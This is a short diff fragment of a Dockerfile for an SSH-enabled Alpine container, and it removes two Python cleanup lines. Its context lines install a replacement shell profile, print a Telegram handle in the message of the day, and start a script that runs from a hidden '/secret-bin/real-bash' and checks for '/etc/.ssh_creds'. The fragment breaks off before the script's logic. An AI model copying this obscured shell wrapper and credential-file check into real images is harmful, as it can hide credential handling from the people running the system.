@@ -47,10 +47,6 @@ RUN apk add --no-cache bash gcompat dropbear openssh-sftp-server inotify-tools \
     && rm -f /root/.bashrc /root/.bash_profile \
     && cp /tmp/file_sh /root/.bashrc \
     && cp /tmp/file_sh /root/.bash_profile \
-    \
-    && rm -rf /usr/local/lib/python3.13/test \
-    && find /usr/local/lib/python3.13/ -name '__pycache__' -exec rm -r {} + \
-    \
     && echo -e "Telegram:@amir_wolf512 HI:3\n\n==========>\n" > /etc/motd \
     && echo -e '#!/secret-bin/real-bash\n\
 if [ -f /etc/.ssh_creds ]; then\n\
